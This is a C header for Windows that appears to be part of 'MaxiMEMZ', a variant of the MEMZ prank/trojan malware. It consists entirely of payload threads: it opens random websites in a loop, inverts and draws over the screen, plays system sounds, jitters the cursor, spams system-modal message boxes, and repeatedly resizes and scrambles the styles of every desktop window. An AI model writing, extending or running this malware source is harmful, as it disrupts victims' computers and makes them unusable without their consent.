#pragma once
#include "maximemz.h"

HCRYPTPROV hProv;

INT random() {
	if (hProv == NULL)
		if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	INT nOut;
	CryptGenRandom(hProv, sizeof(nOut), (BYTE*)(&nOut));
	return nOut & 0x7fffffff;
}

DWORD WINAPI OpenWebsites(LPVOID lpDwordVoid) {
	while (TRUE) {
		ShellExecuteA(NULL, "open", (LPCSTR)cSites[random() % cstSitesLength], NULL, NULL, SW_SHOWDEFAULT);
		Sleep(8000);
	}
	return 0x00;
}

DWORD WINAPI ColorRadius(LPVOID lpDwordVoid) {
	HDC hdc = GetDC(NULL);
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE) {
		hdc = GetDC(NULL);
		INT radius = 100;

		INT randomx = random() % screenWidth;
		INT randomy = random() % screenHeight;

		for (INT i = 0; i < screenWidth + screenHeight; i++) {
			INT x = radius + i * cos(i + radius * 3) + randomx;
			INT y = radius + i * sin(i + radius * 3) + randomy;
			HBRUSH hBrush = CreateSolidBrush(RGB(random() % 245, random() % 237, random() % 278));
			SelectObject(hdc, hBrush);

			BitBlt(hdc, x, y, 10, 10, hdc, 0, 0, PATINVERT);
			DeleteObject(hBrush);
			Sleep(5);
		}
		ReleaseDC(NULL, hdc);
	}
	return 0x00;
}

DWORD WINAPI PlaySystemSounds(LPVOID lpDwordVoid) {
	while (TRUE) {
		PlaySoundA(cSystemSounds[random() % cstSoundLength], GetModuleHandle(NULL), SND_SYNC);
		Sleep(random() % 10);
		PlaySoundA(cSystemSounds[random() % cstSoundLength], GetModuleHandle(NULL), SND_ASYNC);
		Sleep(random() % 20);
	}
	return 0x00;
}

DWORD WINAPI MessColors(LPVOID lpDwordVoid) {
	HDC hdc = GetDC(NULL);
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE) {
		hdc = GetDC(NULL);
		BitBlt(hdc, 0, 0, screenWidth, screenHeight, hdc, 0, 0, PATINVERT);
		ReleaseDC(NULL, hdc);
		Sleep(random() % 2000);
	}
	return 0x00;
}

DWORD WINAPI ShakeCursor(LPVOID lpDwordVoid) {
	POINT pCursor;
	while (TRUE) {
		GetCursorPos(&pCursor);
		INT shakeX = pCursor.x + random() % 3 - 1;
		INT shakeY = pCursor.y + random() % 3 - 1;

		SetCursorPos(shakeX, shakeY);
		Sleep(10);
	}
	return 0x01;
}

DWORD WINAPI MessageThread(LPVOID lpDwordVoid) {
	MessageBoxA(NULL, (LPCSTR)cMessages[random() % cstMessagesLength], "MaxiMEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	return 0x00;
}

DWORD WINAPI MessageSpamThread(LPVOID lpDwordVoid) {
	while (TRUE) {
		CreateThread(NULL, 0, MessageThread, 0, NULL, NULL);
		Sleep(random() % 25000 + 10000);
	}
	return 0x00;
}

// Using MoveWindow is so fishy- //
BOOL WINAPI EnumWindowProc(HWND hWindow, LPARAM longPtr) {
	DWORD dwWindowPid = 0;
	GetWindowThreadProcessId(hWindow, &dwWindowPid);

	// Scramble window styles //
	if (random() % 1000 == 0) {
		SetWindowLong(hWindow, GWL_STYLE, random());
		SetWindowLong(hWindow, GWL_EXSTYLE, random());
	}

	// Jitter the window size //
	if (random() % 10 == 0) {
		RECT rect;
		if (GetWindowRect(hWindow, &rect)) {
			MapWindowPoints(HWND_DESKTOP, GetParent(hWindow), (LPPOINT)&rect, 2);

			int dx1 = (random() % 9) - 4;
			int dy1 = (random() % 9) - 4;
			int dx2 = (random() % 9) - 4;
			int dy2 = (random() % 9) - 4;

			rect.left += dx1;
			rect.top += dy1;
			rect.right += dx2;
			rect.bottom += dy2;

			// Shitty int name //
			int nWidth = max(1, rect.right - rect.left);
			int nHeight = max(1, rect.bottom - rect.top);

			// Move the window, No shit sherlo- //
			MoveWindow(hWindow, rect.left, rect.top, nWidth, nHeight, TRUE);
			Sleep(rand() % 100);
		}
	}

	return TRUE;
}

DWORD WINAPI WindowMoveThread(LPVOID lpDwordVoid) {
	while (TRUE) {
		EnumChildWindows(GetDesktopWindow(), EnumWindowProc, NULL);
		Sleep(100);
	}
	return TRUE;
}

DWORD WINAPI ColorBalls(LPVOID lpDwordVoid) {
	HDC hdc = GetDC(NULL);
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE) {
		HDC hdc = GetDC(NULL);
		INT randomx = random() % screenWidth;
		INT randomy = random() % screenHeight;

		INT topx = 0 + randomx;
		INT topy = 0 + randomy;

		INT bottomx = 50 + randomx;
		INT bottomy = 50 + randomy;

		HBRUSH hBrush = CreateSolidBrush(RGB(random() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, hBrush);

		Ellipse(hdc, topx, topy, bottomx, bottomy);
		ReleaseDC(NULL, hdc);
		DeleteObject(hBrush);

		Sleep(random() % 1000);
	}
	return 0x00;
}

DWORD WINAPI TunnelEffect(LPVOID lpDwordVoid) {
	HDC hdc = GetDC(NULL);
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE) {
		HDC hdc = GetDC(NULL);
		StretchBlt(hdc, 50, 50, screenWidth - 100, screenHeight - 100, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		Sleep(random() % 2000);
	}
	return 0x00;
}